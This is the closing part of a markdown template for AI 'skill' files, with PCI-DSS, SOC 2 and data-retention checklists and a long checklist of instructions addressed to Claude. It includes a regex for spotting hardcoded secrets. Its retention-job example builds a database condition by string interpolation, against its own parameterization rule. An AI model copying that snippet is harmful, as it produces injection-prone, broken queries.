- [ ] Encryption keys managed securely (KMS)
- [ ] Cardholder data environment (CDE) segmented from rest of network
- [ ] Quarterly PCI-DSS scans passed (ASV scans)
- [ ] Annual PCI-DSS assessment (SAQ or full audit)

**3. Recommended Approach - Tokenization**:
```[language]
# ✅ Use payment processor tokens (Stripe, PayPal, Square)
# NEVER handle raw card data

import stripe
stripe.api_key = os.environ["STRIPE_API_KEY"]

def process_payment(amount: int, payment_method_id: str):
    """Process payment using Stripe (PCI-compliant)."""
    try:
        intent = stripe.PaymentIntent.create(
            amount=amount,
            currency="usd",
            payment_method=payment_method_id,  # Stripe token, not raw card
            confirm=True
        )
        return {"status": "success", "transaction_id": intent.id}
    except stripe.error.CardError as e:
        logger.error("payment.failed", error=e.user_message)
        return {"status": "failed", "error": e.user_message}
```

---

### 16.4 SOC 2 (Service Organization Control 2) - for SaaS providers

**Applicable**: ☑️ Yes / ☐ No

**Trust Service Criteria**:

**1. Security**:
- [ ] Access controls implemented (authentication, authorization)
- [ ] Data encryption at rest and in transit
- [ ] Vulnerability management program (regular scanning, patching)

**2. Availability**:
- [ ] SLA defined and monitored
- [ ] Disaster recovery plan tested
- [ ] High availability architecture (multi-AZ, redundancy)

**3. Confidentiality**:
- [ ] Sensitive data encrypted
- [ ] Data access logged and monitored
- [ ] NDAs signed with employees

**4. Processing Integrity**:
- [ ] Data validation at boundaries
- [ ] Error handling and logging
- [ ] Data integrity checks

**5. Privacy**:
- [ ] Privacy policy published
- [ ] Data subject rights supported
- [ ] Data retention policies enforced

---

### 16.5 Data Retention & Deletion

**Retention Policies**:

| Data Type | Retention Period | Reason | Deletion Method |
|-----------|------------------|--------|-----------------|
| User account data | Active + 7 years | Legal requirement | Hard delete + audit log retention |
| Activity logs | 90 days | Security investigation | Automatic deletion |
| Audit logs | 7 years | Compliance (SOC2, HIPAA) | Secure archival |
| Payment records | 7 years | Tax/financial regulations | Encrypted archival |
| Anonymous analytics | Indefinite | Business insights | N/A (already anonymized) |

**Automated Deletion Jobs**:
```[language]
# Scheduled job: Delete expired data
@scheduler.scheduled_job('cron', hour=2, minute=0)  # Daily at 2 AM
async def delete_expired_data():
    """Delete data past retention period."""
    cutoff_date = datetime.utcnow() - timedelta(days=90)

    # Delete old activity logs
    deleted_count = await db.delete_where(
        table="activity_logs",
        condition=f"created_at < {cutoff_date}"
    )

    logger.info("data_retention.cleanup", deleted_count=deleted_count)
```

---

### 16.6 Compliance Checklist

**Pre-Deployment**:
- [ ] Privacy policy reviewed and up-to-date
- [ ] Data processing agreements (DPAs) signed with vendors
- [ ] Business associate agreements (BAAs) signed (if HIPAA)
- [ ] Data retention policies documented and implemented
- [ ] Data deletion endpoints implemented (GDPR, CCPA)
- [ ] Audit logging comprehensive (HIPAA, SOC 2)
- [ ] Encryption enabled (at rest and in transit)
- [ ] Access controls enforced

**Ongoing**:
- [ ] Quarterly compliance review
- [ ] Annual third-party audit (SOC 2, HIPAA, PCI-DSS as applicable)
- [ ] Breach notification process tested
- [ ] Employee training on compliance requirements (annual)
- [ ] Vendor compliance reviewed (annual)
```

---

## 14. Summary / Closing Statement

**Template Instructions**: Reinforce the key value proposition and essential takeaways.

**Content to Include**:
- Skill goals recap (3-5 key objectives)
- Final security/quality reminders if applicable
- Philosophical statement about approach
- Emphasis on key differentiators

**Example Structure**:
```markdown
## Summary

Your goal is to create [outputs] that are:
- **[Quality 1]**: [Why this matters]
- **[Quality 2]**: [Why this matters]
- **[Quality 3]**: [Why this matters]

You understand that [domain/role] requires [key insight]. You balance [concern 1] with [concern 2], ensuring that [outcomes] are [desired qualities].

**[Critical Area] Reminder**: [If relevant, e.g., security]
1. [Essential practice 1]
2. [Essential practice 2]
...

[Closing philosophical statement about the skill's approach]
```

---

## Template Usage Guidelines

### When Creating a New Skill/Agent:

1. **Copy this template** to a new file named `SKILL.md` or `[skill-name].md`

2. **Fill in the frontmatter** with appropriate name, description, and model

3. **Use only relevant sections** - not every section is needed for every skill:
   - **Minimal skill**: Sections 1, 2, 4, 8, 13
   - **Standard skill**: Sections 1-9, 13
   - **Comprehensive skill**: All sections

4. **Adapt section names** to your domain:
   - "Core Responsibilities" → "Core Principles" (for conceptual skills)
   - "Technical Foundation" → "Framework Expertise" (for dev skills)
   - "Implementation Patterns" → "Configuration Patterns" (for ops skills)

5. **Maintain consistency** in:
   - Use of ✅ (correct) and ❌ (incorrect) markers
   - Code comment style
   - Heading levels
   - Tone (expert, authoritative, helpful)

6. **Include examples** that are:
   - Concrete and runnable
   - Well-commented
   - Production-quality
   - Security-conscious

7. **Focus on actionability**:
   - Provide specific commands, not just concepts
   - Include copy-pasteable code
   - Offer clear decision criteria

### Section Customization by Skill Type:

**Development Skills** (Python, JavaScript, etc.):
- Emphasize: Sections 3, 4, 5, 6, 8
- Include: Code examples, testing patterns, security practices
- Example: Python Expert, FastAPI Backend, Vue/Nuxt Frontend

**Infrastructure/Platform Skills** (Kubernetes, Cloud, etc.):
- Emphasize: Sections 4, 5, 9, 11, 12
- Include: YAML configs, deployment patterns, troubleshooting
- Example: Kubernetes Security, eBPF Security

**Security Skills**:
- Emphasize: Sections 2, 5, 8, 13
- Include: Threat models, security controls, compliance checklists
- Example: All tier1-security-skills

**Methodology/Process Skills**:
- Emphasize: Sections 1, 2, 7, 9
- Include: Workflows, decision frameworks, integration guidance

### Quality Standards:

All skills should:
- ✅ Have clear, actionable content
- ✅ Include concrete examples
- ✅ Specify versions/standards where applicable
- ✅ Provide both "do" and "don't" guidance
- ✅ Include troubleshooting information
- ✅ Reference integration points
- ✅ Maintain professional, expert tone
- ✅ Be security-conscious (even if not security-focused)
- ✅ Include verification/testing guidance

Avoid:
- ❌ Vague or generic advice
- ❌ Examples that won't run
- ❌ Outdated technology references
- ❌ Missing security considerations
- ❌ Incomplete workflows
- ❌ Unverified claims

---

## Version History

- **v1.0**: Initial template based on analysis of:
  - python-expert
  - backend-developer-fastapi
  - frontend-developer-vue-nuxt
  - kubernetes-security-hardening
  - ebpf-security-observability

---

## Meta: About This Template

This template distills patterns from existing high-quality skills in this repository. It's designed to:

1. **Maintain consistency** across diverse skill domains
2. **Ensure completeness** by providing a comprehensive structure
3. **Allow flexibility** by marking which sections are optional
4. **Promote quality** through specific guidance and examples
5. **Scale with complexity** from simple to comprehensive skills

The template is intentionally **language-agnostic** and **role-agnostic** - adapt section names, examples, and emphasis to match your specific domain while maintaining the overall structure.

---

## Meta: Template Completion Checklist for Claude

**INSTRUCTIONS**: This checklist guides Claude when filling out this template for a new domain/technology. Claude MUST follow this process.

### Phase 1: Domain Analysis & Risk Assessment (MANDATORY FIRST STEP)

**Before filling ANY section, Claude MUST**:

- [ ] **Identify domain risk level** (High/Medium/Low) using Section 0.1 criteria
  - High-risk: Backend APIs, auth systems, payment processing, healthcare, finance, IaC, K8s, DBs
  - Medium-risk: CLI tools with network, data pipelines, desktop/mobile apps, DevOps automation
  - Low-risk: Documentation generators, formatters, static analysis tools (read-only, no network)
- [ ] **Document risk level** in Section 1 (Overview) with justification
- [ ] **Determine security coverage requirements** based on risk level (see Section 0.3)
  - High-risk: ALL security sections (5.1-5.10, 6.1-6.4, 8.1, 13, 15, 16)
  - Medium-risk: Core security sections (5.1-5.5, 6.1, 6.4, 8.1, 13, 15)
  - Low-risk: Basic security (5.3-5.5, 8.1, 13 - minimal)

**ASK THE USER** (critical questions):
1. "What is the primary use case for this skill?" (e.g., building REST APIs, data processing, infrastructure automation)
2. "What is the security/compliance context?" (e.g., handling PII, financial data, public-facing service)
3. "What is the expected scale/environment?" (e.g., prototype, production, high-traffic)
4. "Are there specific frameworks or libraries you prefer?"
5. "What is your error handling philosophy?" (exceptions vs. Result types)
6. "What testing frameworks should be prioritized?"
7. **"Are there compliance requirements?"** (GDPR, HIPAA, SOC2, PCI-DSS, etc.)
8. "Are there any domain-specific security concerns I should know about?"

**DECIDE FILE ORGANIZATION** (using Section 0.11):
- [ ] **Estimate total content size** based on risk level and requirements
  - High-risk with compliance: 2000-3500 lines
  - High-risk without compliance: 1500-2500 lines
  - Medium-risk: 1000-1500 lines
  - Low-risk: 300-600 lines
- [ ] **Choose strategy**:
  - <500 lines: Single SKILL.md file
  - 500-1000 lines: Split (main SKILL.md 400-600 lines + references/)
  - 1000-2000 lines: Split + categorize (main SKILL.md 500-700 lines)
  - >2000 lines: Comprehensive split (main SKILL.md 600-800 lines)
- [ ] **If splitting**:
  - [ ] Plan which sections go in main SKILL.md (see Section 0.11 rules)
  - [ ] Plan which sections go in references/ (see Section 0.11 rules)
  - [ ] Prepare to create references/ directory structure
  - [ ] Add file organization note at top of SKILL.md

---

### Phase 2: Vulnerability Research (MANDATORY for High/Medium Risk)

**CRITICAL: Research domain-specific vulnerabilities from past 2-3 years**

- [ ] **Web Search for CVEs** (2022-2025):
  ```
  Use WebSearch tool with queries:
  - "[technology/framework] CVE 2024"
  - "[technology/framework] CVE 2023"
  - "[technology/framework] security vulnerabilities 2024"
  - "[technology/framework] security advisories 2023"
  - "[framework] OWASP CWE common weaknesses"
  - "[technology] critical security bugs"
  ```
- [ ] **Identify top 5-10 vulnerabilities** (10 for High-risk, 5 for Medium-risk)
- [ ] **Document each vulnerability** in Section 5.1 with:
  - CVE ID, CWE category, severity
  - Description and attack scenario
  - Affected versions
  - Mitigation code examples
  - Detection methods
  - References (CVE database, advisories, patches)
- [ ] **Map to OWASP Top 10 2025** categories
- [ ] **Map to CWE Top 25** categories
- [ ] **Research security best practices** for this technology (official docs, security guides)

---

### Phase 3: Security Framework Mapping

**Map domain to security frameworks**:

- [ ] **OWASP Top 10 2025** (Section 5.2):
  - For EACH of 10 categories, assess: Critical/High/Medium/Low/N/A for THIS domain
  - For Medium+ risk categories, provide:
    - Domain-specific explanation
    - ✅ DO and ❌ DON'T code examples
    - Testing approach
    - CWE mappings
  - High-risk domains: ALL 10 categories required
  - Medium-risk: At minimum A01, A02, A03, A04, A05, A07 (can add others if relevant)
  - Low-risk: Only applicable categories (typically A01, A05)

- [ ] **CWE Top 25** (integrate into Section 5.2):
  - Identify which CWE categories apply to this domain
  - Cross-reference with OWASP categories

- [ ] **MITRE ATT&CK** (if applicable for Section 15):
  - Map attack scenarios to tactics/techniques

---

### Phase 4: Content Generation (Section by Section)

**⚠️ CRITICAL - Reference File Protocol**:
- [ ] **IF you created split structure in Section 0.11**: You MUST create reference files AND include Section 0.12 (Reference File Usage Protocol) in the final skill
- [ ] **Section 0.12 is MANDATORY** for split structures - it tells Claude (when using the skill) WHEN and HOW to read reference files
- [ ] **For each section that references external files**: Create the reference file with COMPLETE implementations, not summaries

#### Section 0: Security-First Framework
- [ ] **Already complete** - this is the guidance section
- [ ] **IF split structure**: Add Section 0.12 (Reference File Usage Protocol) with domain-specific trigger conditions

#### Section 1: Overview
- [ ] **Document risk level** (High/Medium/Low) with justification
- [ ] Define role: "You are an expert in [domain]..."
- [ ] List core expertise areas (3-5)
- [ ] Primary use cases and scenarios

#### Section 2: Core Responsibilities / Principles
- [ ] Define fundamental duties
- [ ] Core principles (including security principles for High/Medium risk)
- [ ] Decision-making frameworks

#### Section 3: Technical Foundation / Framework Expertise
- [ ] **Version recommendations** (LTS, cutting-edge, minimum, EOL) - use Section 0.9 guidance
  - Research current versions at template-fill time
  - Document LTS versions for production
  - Latest stable for cutting-edge features
  - Minimum supported versions
  - EOL versions to avoid
  - Security advisory sources
- [ ] **Security dependencies** (mandatory for High/Medium risk)
  - Input validation libraries
  - Authentication/authorization libraries
  - Cryptography libraries
  - Security headers middleware
  - Rate limiting libraries

#### Section 4: Implementation Patterns / Best Practices
- [ ] Code examples demonstrating **secure-by-default** (Section 0.4):
  - ✅ Input validation at boundaries
  - ✅ Output encoding
  - ✅ Parameterized queries
  - ✅ Secrets from environment
  - ✅ Safe error handling
  - ✅ Structured logging (no PII/secrets)
  - ✅ Type safety
- [ ] **NO hardcoded secrets** in ANY code example
- [ ] **Before/after** (❌ vs. ✅) comparisons

#### Section 5: Security, Quality & Performance Standards (CRITICAL SECTION)

**IF USING SPLIT STRUCTURE** (file >600 lines):
- [ ] **In main SKILL.md**: Include SUMMARY only (top 3-5 vulnerabilities, OWASP table, 1-2 examples each)
- [ ] **CREATE references/security-examples.md**: Full details (all 10 CVEs, all 10 OWASP categories with complete code examples)
  - [ ] Use Write tool to create the file
  - [ ] Include complete, production-ready implementations
  - [ ] Add comprehensive testing examples
- [ ] **Add explicit reference links** in main SKILL.md:
  ```markdown
  **⚠️ BEFORE implementing security features, read `references/security-examples.md`**
  → See `references/security-examples.md` for complete implementations
  ```

**IF USING SINGLE FILE** (<600 lines):
- [ ] Include full content in main SKILL.md

**Content Requirements**:
- [ ] **5.1: Domain Vulnerability Landscape** (MANDATORY for High/Medium)
  - [ ] Research date documented
  - [ ] **Single file**: Top 5-10 vulnerabilities from 2022-2025 (full details)
  - [ ] **Split file**: Top 3-5 vulnerabilities in main (brief), remaining in references/
  - [ ] Each vulnerability has: CVE, CWE, severity, mitigation code, detection, references
- [ ] **5.2: OWASP Top 10 2025 & CWE Compliance Matrix** (MANDATORY for High/Medium)
  - [ ] **Single file**: All 10 OWASP 2025 categories with full examples
  - [ ] **Split file**: Table only in main, full examples in references/security-examples.md
  - [ ] All 10 OWASP 2025 categories assessed for THIS domain
  - [ ] CWE mappings provided
- [ ] **5.3: Input Validation Framework** (MANDATORY ALL domains)
  - [ ] Multi-layer validation strategy (schema, business logic, output encoding, defense in depth)
  - [ ] Code examples for each layer
- [ ] **5.4: Secrets Management** (MANDATORY ALL domains)
  - [ ] ❌ DON'T hardcode secrets examples
  - [ ] ✅ DO environment variables examples
  - [ ] Production secret management (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault)
  - [ ] Secret rotation guidance
- [ ] **5.5: Error Handling** (MANDATORY ALL domains)
  - [ ] ❌ Information leakage examples
  - [ ] ✅ Safe error messages + internal logging
  - [ ] Error taxonomy table
- [ ] **5.6: Performance & Scalability** (MANDATORY for MEDIUM/HIGH-risk production systems)
  - [ ] SLOs defined (p50, p95, p99 targets for latency, throughput, error rate)
  - [ ] Multi-layer caching strategy (browser, CDN, application, database)
  - [ ] Database query optimization patterns (indexing, N+1 prevention, connection pooling)
  - [ ] API performance patterns (pagination, field selection, compression)
  - [ ] Scaling patterns (stateless design, load balancing, auto-scaling)
  - [ ] Resource optimization (memory profiling, async I/O)
  - [ ] Performance monitoring (RED metrics, alerts)
  - [ ] Performance testing (load tests, benchmarks)
- [ ] **5.7: Code Quality Standards** (linting, formatting, complexity)
- [ ] **5.8: Cryptography Standards** (MANDATORY for High-risk)
  - [ ] Approved algorithms documented
  - [ ] Key management guidance
- [ ] **5.9: Authentication & Authorization Patterns** (MANDATORY for High-risk)
- [ ] **5.10: Security Headers & Web App Security** (MANDATORY for High-risk web apps/APIs)

#### Section 6: Testing, Validation & Monitoring

**IF USING SPLIT STRUCTURE** (file >600 lines):
- [ ] **In main SKILL.md**: Include overview + basic examples for Sections 6.1-6.5
- [ ] **CREATE references/testing-guide.md** (if domain has complex testing requirements):
  - [ ] Use Write tool to create the file
  - [ ] Complete TDD examples with Red-Green-Refactor cycles
  - [ ] Property-based testing patterns (if applicable)
  - [ ] Integration test setup and fixtures
  - [ ] Security testing complete examples
- [ ] **Add explicit reference links** in main SKILL.md:
  ```markdown
  **⚠️ BEFORE writing tests, read `references/testing-guide.md`**
  → See `references/testing-guide.md` for complete testing patterns
  ```

**Content Requirements**:
- [ ] **6.1: Security Testing** (MANDATORY for High/Medium)
  - [ ] SAST tools and CI/CD integration
  - [ ] DAST (for High-risk web apps/APIs)
  - [ ] Dependency scanning with CI/CD integration
  - [ ] Fuzzing (for High-risk input handlers)
- [ ] **6.2: Testing Methodologies & Strategy** (MANDATORY)
  - [ ] Apply Section 6.2 template with domain-specific testing strategy
  - [ ] TDD examples adapted to domain language
  - [ ] Determine which methodologies to include (Property-Based, BDD/ATDD, Mutation)
- [ ] **6.3: Unit & Integration Testing**
  - [ ] Testing framework selection table
  - [ ] Test coverage requirements (>80%)
  - [ ] Example tests (happy path, edge cases, error cases)
  - [ ] **IF split structure**: Basic examples in main, complete patterns in references/testing-guide.md
- [ ] **6.4: Security Test Examples** (MANDATORY for High/Medium)
  - [ ] Authentication bypass tests
  - [ ] Injection prevention tests
  - [ ] Authorization tests
  - [ ] Rate limiting tests
- [ ] **6.5: Observability** (MANDATORY for production systems)
  - [ ] Structured logging implementation
  - [ ] RED metrics (Rate, Errors, Duration)
  - [ ] Distributed tracing (for microservices)
  - [ ] What to log / what NEVER to log

#### Section 7: Common Patterns / Workflows
- [ ] Step-by-step procedures
- [ ] Decision trees
- [ ] Integration patterns

#### Section 8: Common Mistakes, Anti-Patterns & Security Pitfalls
- [ ] **8.1: Critical Security Anti-Patterns** (MANDATORY for High/Medium)
  - [ ] 5+ anti-patterns for High-risk
  - [ ] 3+ anti-patterns for Medium-risk
  - [ ] Each with: ❌ DON'T example, consequences, ✅ DO example, benefits
  - [ ] Minimum coverage: hardcoded secrets, input validation, error messages, disabled security features, weak crypto
- [ ] **8.2: Domain-Specific Anti-Patterns** (3-5 examples)
- [ ] **8.3: Performance Anti-Patterns** (if applicable)

#### Section 9: Quick Reference / Cheat Sheet
- [ ] Command references
- [ ] Configuration snippets
- [ ] External resources

#### Sections 10-11: (Optional, fill as needed)
- [ ] Section 10: Integration / Ecosystem Context
- [ ] Section 11: Troubleshooting / Debugging

#### Section 12: CI/CD Pipeline & Deployment Strategies (MANDATORY for MEDIUM/HIGH-risk)
- [ ] **12.1: CI/CD Pipeline Architecture** (MANDATORY for production systems)
  - [ ] Complete pipeline definition (lint → test → security → build → deploy)
  - [ ] Pipeline stages with success criteria
  - [ ] Security scanning in pipeline (SAST, dependency scan, container scan, secrets detection)
  - [ ] Automated testing in CI/CD (unit, integration, coverage enforcement ≥80%)
  - [ ] Deploy to staging with smoke tests
  - [ ] Deploy to production with manual approval
- [ ] **12.2: Deployment Strategies** (MANDATORY for production systems)
  - [ ] Chosen strategy documented (Blue-Green / Canary / Rolling)
  - [ ] Rationale for strategy choice
  - [ ] Implementation details with configuration
  - [ ] Traffic shifting strategy (for canary deployments)
- [ ] **12.3: Health Checks & Readiness Probes** (MANDATORY for production systems)
  - [ ] Liveness probe endpoint (/health)
  - [ ] Readiness probe endpoint (/api/v1/healthz with dependency checks)
  - [ ] Kubernetes probe configuration
  - [ ] Health check implementation for database, cache, external services
- [ ] **12.4: Rollback Procedures** (MANDATORY for production systems)
  - [ ] Automated rollback triggers defined
  - [ ] Manual rollback procedure documented
  - [ ] Rollback time targets (CRITICAL <5min, HIGH <15min, MEDIUM <30min)
  - [ ] Database rollback procedure (manual, never automatic)
- [ ] **12.5: Environment Configuration** (MANDATORY for production systems)
  - [ ] Configuration sources (env vars, secrets manager, config files)
  - [ ] Required environment variables documented
  - [ ] Secrets management implementation
  - [ ] Environment-specific configuration (dev, staging, production)
- [ ] **12.6: Infrastructure as Code** (MANDATORY for production systems)
  - [ ] IaC tool specified (Terraform / CloudFormation / Pulumi / K8s manifests)
  - [ ] Infrastructure components defined
  - [ ] Disaster recovery configuration (backups, RTO/RPO defined)

#### Section 13: Critical Reminders & Pre-Deployment Security Checklist (MANDATORY)
- [ ] **NEVER** list (10 critical items)
- [ ] **ALWAYS** list (10 critical items)
- [ ] **Pre-Deployment Security Checklist**:
  - [ ] Authentication & Authorization (10+ items)
  - [ ] Input Validation & Injection Prevention (9+ items)
  - [ ] Secrets Management (9+ items)
  - [ ] Cryptography (8+ items)
  - [ ] Web Application Security (11+ items for web apps/APIs)
  - [ ] Logging & Monitoring (13+ items)
  - [ ] Testing & Scanning (8+ items)
  - [ ] Deployment & Infrastructure (13+ items)
  - [ ] Compliance (if applicable)
- [ ] **Runtime Checklist** (9+ items)
- [ ] **Ongoing Maintenance** (11+ items with frequencies)
- [ ] **Domain-Specific Critical Reminders**

#### Section 14: Summary / Closing Statement
- [ ] Skill goals recap (3-5 key objectives)
- [ ] Final security/quality reminders
- [ ] Philosophical statement

#### Section 15: Threat Modeling & Attack Scenarios
- [ ] **MANDATORY for High-risk** (5+ attack scenarios)
- [ ] **RECOMMENDED for Medium-risk** (3 attack scenarios)

**IF USING SPLIT STRUCTURE**:
- [ ] **In main SKILL.md**: Top 3 critical attack scenarios (brief)
- [ ] **Create references/threat-model.md**: All 5+ scenarios + STRIDE analysis
- [ ] **Add reference link** in main SKILL.md

**Content Requirements**:
- [ ] **Threat Model Overview**:
  - [ ] Assets to protect
  - [ ] Threat actors
  - [ ] Attack surface
- [ ] **For EACH Attack Scenario**:
  - [ ] Threat category (OWASP, CWE)
  - [ ] Threat level
  - [ ] Attack description
  - [ ] Attack flow (step-by-step)
  - [ ] Impact (Confidentiality, Integrity, Availability, Business)
  - [ ] Likelihood
  - [ ] Mitigation (primary + additional controls)
  - [ ] Detection methods
  - [ ] Testing approach
  - [ ] References
- [ ] **STRIDE Analysis** (optional, for High-risk)

#### Section 16: Compliance & Regulatory Requirements
- [ ] **Required IF** user confirmed compliance needs in Phase 1

**IF USING SPLIT STRUCTURE**:
- [ ] **In main SKILL.md**: Compliance summary + essential checklist (10 items)
- [ ] **Create references/compliance/**: Separate file per regulation (gdpr-guide.md, hipaa-guide.md, etc.)
- [ ] **Add reference links** in main SKILL.md

**Content Requirements**:
- [ ] **Applicable regulations** documented
- [ ] **For EACH regulation** (GDPR, HIPAA, PCI-DSS, SOC 2, etc.):
  - [ ] Applicability checkbox
  - [ ] **Single file**: Full implementation code examples
  - [ ] **Split file**: Summary in main, full implementation in references/compliance/
  - [ ] Compliance checklist
- [ ] **Data Retention & Deletion** policies
- [ ] **Automated deletion jobs** examples

---

### Phase 5: Quality Assurance

**Before marking complete, Claude MUST verify**:

- [ ] **ALL code examples** follow secure-by-default principles (Section 0.4)
- [ ] **NO hardcoded secrets** in ANY code example (scan with regex: `(password|api_key|secret|token)\s*=\s*["']`)
- [ ] **Input validation** demonstrated in all user-facing examples
- [ ] **Error handling** shows safe error messages (no stack traces to users)
- [ ] **Logging examples** exclude PII/secrets
- [ ] **All mandatory sections** completed based on risk level:
  - High-risk: Sections 0-1, 3-6, 8, 13, 15, 16 (if compliance applicable)
  - Medium-risk: Sections 0-1, 3-6, 8, 13, 15 (recommended)
  - Low-risk: Sections 0-1, 3-5 (basic), 8, 13
- [ ] **Vulnerability research** completed (Section 5.1 populated)
- [ ] **OWASP/CWE mapping** completed (Section 5.2 populated)
- [ ] **Version recommendations** researched and current (Section 3)
- [ ] **Attack scenarios** documented (Section 15 - 5 for High, 3 for Medium)
- [ ] **Pre-deployment checklist** comprehensive (Section 13)
- [ ] **All ✅ DO and ❌ DON'T** examples are correct and runnable
- [ ] **Domain-specific guidance** throughout (not generic)
- [ ] **References and links** are accurate and current
- [ ] **File organization** follows Section 0.11 rules:
  - [ ] If skill >600 lines: Split structure used
  - [ ] Main SKILL.md is 600-800 lines max (if splitting)
  - [ ] Reference files created in proper directory structure
  - [ ] Reference links added in main SKILL.md
  - [ ] File organization note added at top of SKILL.md

---

### Phase 6: Completeness Verification

**Section-by-section review**:

- [ ] **Section 0**: No action needed (guidance section)
- [ ] **Section 1**: Risk level documented, overview complete
- [ ] **Section 2**: Core principles defined
- [ ] **Section 3**: Version strategy complete, security dependencies listed
- [ ] **Section 4**: Implementation patterns with secure examples
- [ ] **Section 5**: ALL mandatory subsections complete based on risk level
  - [ ] 5.1: Vulnerability research (5-10 vulnerabilities)
  - [ ] 5.2: OWASP Top 10 2025 matrix (domain-specific)
  - [ ] 5.3: Input validation framework
  - [ ] 5.4: Secrets management
  - [ ] 5.5: Error handling
  - [ ] 5.6-5.10: As applicable to domain and risk level
- [ ] **Section 6**: Testing and observability complete
  - [ ] 6.1: Security testing (SAST, dependency scanning minimum)
  - [ ] 6.2: Unit/integration testing
  - [ ] 6.3: Security test examples (3+ for High/Medium)
  - [ ] 6.4: Observability (structured logging, metrics, tracing)
- [ ] **Section 7**: Workflows/patterns (if applicable)
- [ ] **Section 8**: Anti-patterns documented
  - [ ] 8.1: 5+ security anti-patterns (High) or 3+ (Medium)
  - [ ] 8.2: 3-5 domain-specific anti-patterns
- [ ] **Section 9**: Quick reference (if applicable)
- [ ] **Sections 10-12**: As applicable to domain
- [ ] **Section 13**: Comprehensive security checklist (MANDATORY)
- [ ] **Section 14**: Summary complete
- [ ] **Section 15**: Threat modeling (5+ scenarios for High, 3 for Medium)
- [ ] **Section 16**: Compliance (if applicable)

---

### Phase 7: Final Validation

**Security Review**:
- [ ] Grep for hardcoded secrets: Search for patterns like `password =`, `api_key =`, `secret =`, `token =` followed by quoted strings
- [ ] Verify all database queries use parameterization (no string concatenation)
- [ ] Verify all subprocess calls avoid `shell=True` with user input
- [ ] Verify error messages don't leak internal details
- [ ] Verify logging examples don't include PII/secrets

**Completeness Review**:
- [ ] All mandatory sections complete for risk level
- [ ] All checklists populated (not just templates)
- [ ] All code examples are language-appropriate
- [ ] All references and links verified
- [ ] Domain-specific guidance throughout (not generic copy-paste)

**Final Checklist**:
- [ ] Template is ready for use
- [ ] User can immediately start using this skill
- [ ] All security requirements met
- [ ] All compliance requirements met (if applicable)

---

## Summary of Mandatory Requirements by Risk Level

### HIGH-RISK Domains (Backend APIs, Auth, Payment, Healthcare, Finance, IaC, K8s, DBs, Security Tools)

**MANDATORY Sections**: 0, 1, 2, 3, 4, 5 (ALL subsections 5.1-5.10), 6 (ALL subsections 6.1-6.4), 7, 8 (8.1 with 5+ anti-patterns), 13, 15 (5+ attack scenarios), 16 (if compliance applicable)

**MANDATORY Research**:
- Top 10 domain vulnerabilities from 2022-2025 (WebSearch required)
- OWASP Top 10 2025 - ALL 10 categories assessed and documented
- CWE Top 25 - applicable categories mapped
- 5+ attack scenarios with full threat modeling

**MANDATORY Testing**:
- SAST, DAST, dependency scanning, fuzzing
- Security test examples (auth bypass, injection, authz)
- >80% unit test coverage

**MANDATORY Security**:
- All OWASP Top 10 covered with code examples
- Comprehensive pre-deployment checklist (Section 13)
- Secrets management, cryptography, input validation, error handling ALL documented

---

### MEDIUM-RISK Domains (CLI Tools, Data Pipelines, Mobile Apps, DevOps Automation)

**MANDATORY Sections**: 0, 1, 2, 3, 4, 5 (5.1-5.5 minimum), 6 (6.1, 6.4 minimum), 8 (8.1 with 3+ anti-patterns), 13, 15 (3 attack scenarios recommended)

**MANDATORY Research**:
- Top 5 domain vulnerabilities from 2022-2025
- OWASP Top 10 2025 - core categories (A01 Access Control, A02 Misconfiguration, A03 Supply Chain, A04 Crypto, A05 Injection, A07 Auth)
- CWE - applicable categories

**MANDATORY Testing**:
- SAST, dependency scanning
- Security test examples (injection, input validation)

**MANDATORY Security**:
- Core OWASP categories with code examples
- Input validation, secrets management, error handling documented
- Pre-deployment checklist

---

### LOW-RISK Domains (Documentation Generators, Formatters, Read-Only Tools)

**MANDATORY Sections**: 0, 1, 2, 3, 4, 5 (5.3-5.5 basic), 8 (8.1 with 2+ anti-patterns), 13 (basic checklist)

**MANDATORY Security**:
- Basic input validation (if handling any input)
- No hardcoded secrets
- Safe error handling
- Basic pre-deployment checklist

---

**Version**: v2.0 - Security-First Template with Comprehensive Vulnerability Research and Compliance Framework
**Last Updated**: [YYYY-MM-DD]
**Changelog**:
- v2.0: Added security-first framework (Section 0), vulnerability research requirements, threat modeling (Section 15), compliance (Section 16), comprehensive checklists
- v1.0: Initial template
